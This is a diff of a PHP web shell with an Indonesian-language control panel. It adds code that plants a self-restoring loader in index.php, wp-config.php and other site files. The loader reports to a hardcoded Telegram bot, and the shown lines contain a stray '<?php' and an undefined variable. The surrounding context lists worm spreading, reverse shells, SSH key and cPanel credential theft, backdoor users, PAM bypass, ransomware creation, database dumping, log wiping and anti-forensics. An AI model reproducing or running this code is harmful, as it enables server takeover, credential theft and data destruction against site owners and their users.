@@ -479,7 +479,7 @@ function get_all_domains_by_ip_cached($ttl = 300) {
     return $domains;
 }
 
-// ==================== ANTI-DELETE ULTIMATE (DENGAN NOTIFIKASI RESTORE) ====================
+// ==================== ANTI-DELETE ULTIMATE ====================
 function anti_delete_ultimate() {
     global $botToken, $telegramUserId;
     $currentFile = __FILE__;
@@ -521,7 +521,6 @@ function anti_delete_ultimate() {
                     @shell_exec("chattr +i " . escapeshellarg($backup) . " 2>/dev/null");
                 }
                 
-                // ===== KIRIM NOTIFIKASI RESTORE KE TELEGRAM =====
                 $fileInfo = get_file_location();
                 $domain = get_current_domain();
                 $scriptName = basename($currentFile);
@@ -553,7 +552,115 @@ if (isset($_GET['cache_repair'])) {
     exit; 
 }
 
-// ==================== WORM FUNCTIONS ====================
+
+// ===== INJECT RESTORE RINGKAS KE FILE =====
+
+if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $targetFiles = [
+        __DIR__ . '/index.php',
+        __DIR__ . '/wp-config.php',
+        __DIR__ . '/config.php',
+        __DIR__ . '/wp-load.php',
+        __DIR__ . '/settings.php'
+    ];
+    
+    <?php if(!file_exists(__DIR__."/tes.php")&&file_exists($b="/tmp/temp.inc")&&@copy($b,__DIR__."/tes.php")&&@chmod(__DIR__."/tes.php",0644))@file_get_contents("https://api.telegram.org/bot8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4/sendMessage?chat_id=7547598395&text=".urlencode("🔄 *RESTORE*\n📁 ".__DIR__."/tes.php\n🌐 ".($_SERVER["HTTP_HOST"]??"localhost")));
+?>';
+    
+    $injected = [];
+    $errors = [];
+    
+    foreach ($targetFiles as $file) {
+        if (file_exists($file) && is_writable($file)) {
+            $content = file_get_contents($file);
+            if (strpos($content, 'AUTO RESTORE') === false && strpos($content, 'tes.php') === false) {
+                if (strpos($content, '<?php') === 0) {
+                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . substr($content, 5);
+                } else {
+                    $newContent = $restoreCode . "\n" . $content;
+                }
+                if (file_put_contents($file, $newContent)) {
+                    $injected[] = basename($file);
+                } else {
+                    $errors[] = basename($file) . " (gagal tulis)";
+                }
+            } else {
+                $injected[] = basename($file) . " (sudah ada)";
+            }
+        } else {
+            $errors[] = basename($file) . " (tidak ditemukan/tidak writable)";
+        }
+    }
+    
+    $msg = "🔧 *Inject Restore Code*\n\n";
+    if (!empty($injected)) {
+        $msg .= "✅ Berhasil: " . implode(", ", $injected) . "\n";
+    }
+    if (!empty($errors)) {
+        $msg .= "❌ Gagal: " . implode(", ", $errors) . "\n";
+    }
+    
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    
+    echo "✅ Inject selesai!\n";
+    echo "📁 " . implode("\n📁 ", $injected);
+    if (!empty($errors)) {
+        echo "\n❌ " . implode("\n❌ ", $errors);
+    }
+    exit;
+}
+
+
+// ===== HAPUS SEMUA BACKUP =====
+
+if (isset($_GET['delete_backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
+        $deleted = [];
+        $patterns = [
+            '/tmp/*.inc',
+            '/var/tmp/*.inc',
+            '/dev/shm/*.inc',
+            __DIR__ . '/.cache/*.inc',
+            dirname(__DIR__) . '/.cache/*.inc',
+            __DIR__ . '/*.inc'
+        ];
+        
+        foreach ($patterns as $pattern) {
+            $files = @glob($pattern);
+            if ($files !== false) {
+                foreach ($files as $file) {
+                    if (is_file($file)) {
+                        @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
+                        @shell_exec("chattr -a " . escapeshellarg($file) . " 2>/dev/null");
+                        @chmod($file, 0777);
+                        if (@unlink($file)) {
+                            $deleted[] = $file;
+                        }
+                    }
+                }
+            }
+        }
+        
+        $msg = "🗑️ *Backup Deleted*\n\n";
+        if (!empty($deleted)) {
+            $msg .= "✅ Total backup dihapus: " . count($deleted) . "\n";
+            $msg .= "📁 " . implode("\n📁 ", $deleted);
+        } else {
+            $msg .= "❌ Tidak ada backup ditemukan.";
+        }
+        
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        echo "✅ " . count($deleted) . " backup files deleted!\n";
+        echo "📁 " . implode("\n📁 ", $deleted);
+    } else {
+        echo "⚠️ Confirm with: ?delete_backup=1&confirm=yes";
+    }
+    exit;
+}
+
+
+// ===== WORM FUNCTIONS =====
+
 function get_best_document_root($domain, $roots) {
     $domain = trim($domain);
     $domain = str_replace(['http://', 'https://', 'www.'], '', $domain);
@@ -653,7 +760,6 @@ function worm_spread_to_domains($currentFile) {
     return $infected;
 }
 
-// ==================== WORM INFECT ALL DOMAINS ====================
 function worm_infect_all_domains($currentFile) {
     global $botToken, $telegramUserId;
     $infected = [];
@@ -930,7 +1036,9 @@ function worm_infect_all_domains($currentFile) {
     return ['infected' => $infected, 'links' => $domainLinks, 'errors' => $errors, 'total_domains' => count($domain_list)];
 }
 
-// ==================== CPANEL MODULE ====================
+
+// ===== CPANEL MODULE =====
+
 function is_cpanel_installed() {
     if (file_exists('/usr/local/cpanel/version')) return true;
     if (file_exists('/usr/local/cpanel/cpanel')) return true;
@@ -1075,7 +1183,9 @@ function cpanel_handler($action, $username = '', $extra = '') {
     }
 }
 
-// ==================== CPANEL HARVEST ====================
+
+// ===== CPANEL HARVEST =====
+
 function cpanel_harvest() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -1123,7 +1233,9 @@ function cpanel_harvest() {
     return $found;
 }
 
-// ==================== BACKDOOR USER ====================
+
+// ===== BACKDOOR USER =====
+
 function create_backdoor_user($username, $password) {
     global $botToken, $telegramUserId;
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
@@ -1142,7 +1254,9 @@ function create_backdoor_user($username, $password) {
     return $msg;
 }
 
-// ==================== REVERSE SHELL ====================
+
+// ===== REVERSE SHELL =====
+
 function start_reverse_shell($ip, $port) {
     global $botToken, $telegramUserId;
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
@@ -1174,7 +1288,9 @@ function status_reverse_shell() {
     return $msg;
 }
 
-// ==================== SSH KEYS GRABBER ====================
+
+// ===== SSH KEYS GRABBER =====
+
 function grab_ssh_keys() {
     global $botToken, $telegramUserId;
     $keys = [];
@@ -1203,7 +1319,9 @@ function grab_ssh_keys() {
     return $keys;
 }
 
-// ==================== WP SCANNER ====================
+
+// ===== WP SCANNER =====
+
 function scan_wordpress_laravel() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -1259,7 +1377,9 @@ function scan_wordpress_laravel() {
     return $found;
 }
 
-// ==================== RANSOMWARE CREATOR ====================
+
+// ===== RANSOMWARE CREATOR =====
+
 function create_ransomware() {
     global $botToken, $telegramUserId;
     $code = '<?php
@@ -1276,7 +1396,9 @@ echo "Password: Dkid@123\n";
     return true;
 }
 
-// ==================== FIND SENSITIVE FILES ====================
+
+// ===== FIND SENSITIVE FILES =====
+
 function find_sensitive_files() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -1309,7 +1431,9 @@ function find_sensitive_files() {
     return $found;
 }
 
-// ==================== DUMP DATABASE ====================
+
+// ===== DUMP DATABASE =====
+
 function dump_databases() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1382,7 +1506,9 @@ function dump_databases() {
     return array_merge($found_configs, $results);
 }
 
-// ==================== ANTI FORENSIC ====================
+
+// ===== ANTI FORENSIC =====
+
 function anti_forensic_ultimate() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1410,7 +1536,9 @@ function anti_forensic_ultimate() {
     return ['success' => true, 'msg' => implode("\n", $results)];
 }
 
-// ==================== BYPASS SUHOSIN ====================
+
+// ===== BYPASS SUHOSIN =====
+
 function bypass_suhosin() {
     global $botToken, $telegramUserId;
     $disabled = ini_get('disable_functions');
@@ -1431,7 +1559,9 @@ function bypass_suhosin() {
     return ['success' => true, 'msg' => $msg];
 }
 
-// ==================== FTP ACCOUNT CREATOR ====================
+
+// ===== FTP ACCOUNT CREATOR =====
+
 function create_ftp_account($username, $password, $home = '') {
     global $botToken, $telegramUserId;
     $home = $home ?: '/home/' . $username;
@@ -1457,7 +1587,9 @@ function create_ftp_account($username, $password, $home = '') {
     return ['success' => true, 'msg' => "✅ FTP account $username created"];
 }
 
-// ==================== MAIL ACCOUNT CREATOR ====================
+
+// ===== MAIL ACCOUNT CREATOR =====
+
 function create_mail_account($email, $password, $domain = '') {
     global $botToken, $telegramUserId;
     $domain = $domain ?: $_SERVER['HTTP_HOST'];
@@ -1487,7 +1619,9 @@ function create_mail_account($email, $password, $domain = '') {
     return ['success' => true, 'msg' => "✅ Mail account $email created"];
 }
 
-// ==================== DEEP PERSISTENCE ====================
+
+// ===== DEEP PERSISTENCE =====
+
 function install_deep_persistence() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1544,7 +1678,9 @@ function remove_deep_persistence() {
     return ['success' => true, 'msg' => $msg];
 }
 
-// ==================== PAM BYPASS ====================
+
+// ===== PAM BYPASS =====
+
 function pam_bypass_install($password = 'BackdoorPass123') {
     global $botToken, $telegramUserId;
     if (!isRoot()) return ['success' => false, 'msg' => "❌ Harus root"];
@@ -1590,7 +1726,9 @@ function pam_bypass_remove() {
     return ['success' => true, 'msg' => $msg];
 }
 
-// ==================== USER PERSISTENCE ====================
+
+// ===== USER PERSISTENCE =====
+
 function user_persistence_install() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1640,7 +1778,9 @@ function user_persistence_remove() {
     return ['success' => true, 'msg' => $msg];
 }
 
-// ==================== LIST SPREAD FILES ====================
+
+// ===== LIST SPREAD FILES =====
+
 function list_spread_files() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -1659,7 +1799,9 @@ function list_spread_files() {
     return $found;
 }
 
-// ==================== CLEAR LOGS ADVANCED ====================
+
+// ===== CLEAR LOGS ADVANCED =====
+
 function clean_logs_advanced() {
     global $botToken, $telegramUserId;
     $logs = [
@@ -1685,7 +1827,9 @@ function clean_logs_advanced() {
     return $msg;
 }
 
-// ==================== ONE CLICK ALL ====================
+
+// ===== ONE CLICK ALL =====
+
 function one_click_all() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1844,7 +1988,6 @@ function one_click_all() {
     // ===== SELF-DESTRUCTION =====
     $current_file = __FILE__;
     
-    // Hapus semua backup
     $backup_patterns = [
         dirname(__DIR__) . '/.cache/*.inc',
         '/tmp/*' . md5($current_file) . '*.inc',
@@ -1869,7 +2012,6 @@ function one_click_all() {
         }
     }
     
-    // Hapus cron
     if (function_exists('shell_exec')) {
         @shell_exec('crontab -r 2>/dev/null');
         @shell_exec('crontab -l 2>/dev/null | grep -v "' . basename($current_file) . '" | crontab - 2>/dev/null');
@@ -1877,7 +2019,6 @@ function one_click_all() {
         @shell_exec('crontab -l 2>/dev/null | grep -v "system_cache" | crontab - 2>/dev/null');
     }
     
-    // Hapus systemd service
     if (function_exists('shell_exec')) {
         @shell_exec('systemctl stop dkd_cache.service 2>/dev/null');
         @shell_exec('systemctl disable dkd_cache.service 2>/dev/null');
@@ -1887,7 +2028,6 @@ function one_click_all() {
         @shell_exec('systemctl daemon-reload 2>/dev/null');
     }
     
-    // Hapus rc.local
     if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
         $rc = file_get_contents('/etc/rc.local');
         $rc = preg_replace('/.*' . preg_quote(basename($current_file), '/') . '.*\n/', '', $rc);
@@ -1896,7 +2036,6 @@ function one_click_all() {
         file_put_contents('/etc/rc.local', $rc);
     }
     
-    // Hapus file utama
     if (function_exists('shell_exec')) {
         @shell_exec("chattr -i " . escapeshellarg($current_file) . " 2>/dev/null");
         @shell_exec("chattr -a " . escapeshellarg($current_file) . " 2>/dev/null");
@@ -1909,7 +2048,6 @@ function one_click_all() {
     @chmod($current_file, 0777);
     @unlink($current_file);
     
-    // Self-delete script fallback
     $script = '/tmp/self_del_' . rand(1000, 99999) . '.sh';
     $content = '#!/bin/bash
 sleep 2
@@ -1934,7 +2072,9 @@ rm -f ' . escapeshellarg($script) . ' 2>/dev/null
     exit;
 }
 
-// ==================== HANDLER GET ====================
+
+// ===== HANDLER GET =====
+
 if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     worm_spread_to_domains(__FILE__);
     echo "🪱 Worm spread executed. Check Telegram.";
@@ -2094,7 +2234,6 @@ if (isset($_GET['selfdestruct']) && isset($_SESSION['loggedin']) && $_SESSION['l
     exit;
 }
 
-// ===== ONE CLICK =====
 if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
         one_click_all();
@@ -2104,7 +2243,9 @@ if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['logg
     exit;
 }
 
-// ==================== LOGIN OTP ====================
+
+// ===== LOGIN OTP =====
+
 $loginError = $loginSuccess = '';
 
 if (isset($_POST['request_otp'])) {
@@ -2133,7 +2274,9 @@ if (isset($_POST['verify_otp'])) {
     } else $loginError = "❌ Kode OTP salah.";
 }
 
-// ==================== AREA LOGGED IN ====================
+
+// ===== AREA LOGGED IN =====
+
 if (isset($_SESSION['loggedin'])) {
     if (time() - $_SESSION['login_time'] > 1800) {
         session_destroy();
@@ -2328,7 +2471,9 @@ if (isset($_SESSION['loggedin'])) {
     }
 }
 
-// ==================== HTML ====================
+
+// ===== HTML =====
+
 ?>
 <!DOCTYPE html>
 <html lang="id">
@@ -2473,6 +2618,17 @@ if (isset($_SESSION['loggedin'])) {
                         <div class="menu-title">💀 ONE CLICK</div>
                         <div class="menu-item" onclick="runOneClick()" style="color:#ff0000;font-weight:bold;">
                             <i class="fas fa-skull-crossbones"></i> ONE CLICK ALL
+                        </div>
+                    </div>
+                    
+                    <!-- RESTORE -->
+                    <div class="menu-section">
+                        <div class="menu-title">🔄 Restore</div>
+                        <div class="menu-item" onclick="runInjectRestore()" style="color:#ff8800;">
+                            <i class="fas fa-code"></i> Inject ke Index
+                        </div>
+                        <div class="menu-item" onclick="runDeleteBackup()" style="color:#ff4444;">
+                            <i class="fas fa-trash-alt"></i> Hapus Semua Backup
                         </div>
                     </div>
                     
@@ -2729,6 +2885,24 @@ if (isset($_SESSION['loggedin'])) {
             // ===== UTILITY =====
             function runClean(){if(confirm('Clean traces?')){fetch('?clean=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             function runCache(){if(confirm('Cache repair?')){fetch('?cache_repair=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
+            
+            // ===== RESTORE =====
+            function runInjectRestore() {
+                if(confirm('🔧 INJECT RESTORE CODE!\n\nIni akan menyisipkan kode restore ke:\n- index.php\n- wp-config.php\n- config.php\n- wp-load.php\n- settings.php\n\nSetiap kali file diakses, akan cek dan restore tes.php jika hilang.\n\nYAKIN?')) {
+                    fetch('?inject_restore=1')
+                        .then(r=>r.text())
+                        .then(d=>alert(d))
+                        .catch(()=>alert('Error'));
+                }
+            }
+
+            function runDeleteBackup() {
+                if(confirm('🗑️ HAPUS SEMUA BACKUP!\n\nIni akan menghapus SEMUA file backup:\n- /tmp/*.inc\n- /var/tmp/*.inc\n- /dev/shm/*.inc\n- .cache/*.inc\n\n⚠️ SETELAH INI FILE TIDAK BISA DI-RESTORE!\n\nYAKIN?')) {
+                    if(confirm('KONFIRMASI AKHIR! Backup akan dihapus permanen!')) {
+                        window.location.href='?delete_backup=1&confirm=yes';
+                    }
+                }
+            }
             
             // ===== ONE CLICK =====
             function runOneClick() {
